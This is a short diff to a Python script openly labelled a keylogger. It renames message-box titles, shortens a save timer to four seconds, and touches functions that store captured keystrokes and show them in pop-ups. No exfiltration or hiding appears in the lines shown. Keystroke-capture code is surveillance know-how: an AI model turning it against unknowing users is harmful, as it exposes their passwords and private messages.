@@ -37,7 +37,7 @@ def on_release(key):
         if stop:
             for i in range(4):
                 input_keys.pop()
-            msgbox('Monitoring is stoped !')
+            msgbox('KeyLogger','Monitoring is stoped !')
             return False
         else:
             pass
@@ -52,7 +52,7 @@ def save_to_memory():
         memory[time_stamp()] = text
         input_keys = []
     ### timer   ###
-    threading.Timer(300, save_to_memory).start()
+    threading.Timer(4, save_to_memory).start()
 
 
 ###     print memory        ###
@@ -62,11 +62,11 @@ def print_memory():
             text = 'memory' + '\n' * 3
             for i in memory.values():
                 text += i + '\n'
-            msgbox(str(text))
+            msgbox('KeyLogger - Memory',str(text))
         else:
-            msgbox('The memory is empty !')
+            msgbox('KeyLogger','The memory is empty !')
     except:
-        msgbox('Error')
+        msgbox('KeyLogger','Error')
 
 
 ###     keyboard listener      ###
